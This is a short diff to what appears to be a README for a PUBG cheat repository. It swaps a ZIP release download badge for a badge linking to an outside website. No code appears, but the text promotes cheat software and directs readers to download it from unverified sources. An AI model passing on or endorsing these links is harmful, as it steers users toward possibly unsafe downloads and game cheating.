@@ -7,8 +7,8 @@
 <br>
 
 <p align="center">
-  <a href="https://github.com/ashtherapistpillar/PUBG-private-cheatc-midnight/releases/download/v1.0.0/PubgMidnight.zip">
-    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD-MIDNIGHT-8A2BE2?style=for-the-badge&logo=github" alt="Download Midnight">
+  <a href="https://modbay.live/library/pubg">
+    <img src="https://img.shields.io/badge/🌐%20OPEN%20WEBSITE-MIDNIGHT-8A2BE2?style=for-the-badge&logo=google-chrome" alt="Open Website">
   </a>
   <a href="https://github.com/ashtherapistpillar/PUBG-private-cheatc-midnight/releases">
     <img src="https://img.shields.io/badge/RELEASES-V1.0.0-blue?style=for-the-badge" alt="Releases">
@@ -17,6 +17,7 @@
     <img src="https://img.shields.io/badge/GITHUB-REPOSITORY-black?style=for-the-badge&logo=github" alt="GitHub">
   </a>
 </p>
+
 
 <br>
 
